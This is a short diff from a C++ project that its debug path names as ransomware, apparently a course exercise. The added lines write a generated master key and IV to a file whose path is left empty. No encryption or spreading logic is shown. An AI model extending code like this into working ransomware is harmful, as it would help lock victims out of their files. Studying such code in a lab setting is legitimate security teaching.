@@ -20,6 +20,15 @@ int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 	PBYTE masterIV, masterKey;
 	DWORD status = generateKeyAndIV(&masterIV, &masterKey);
+
+	string pathToMasters = "";
+	std::ofstream masterKeyIVFile;
+	masterKeyIVFile.open(pathToMasters, std::ios::binary);
+	masterKeyIVFile.write((char*)masterKey, KEY_LEN);
+	masterKeyIVFile.write((char*)masterIV, IV_LEN);
+	masterKeyIVFile.close();
+
+	
 #ifdef DEBUG
 	string path = "C:\\Programming\\RansomWare\\236499\\test\\rans.txt";
 #else
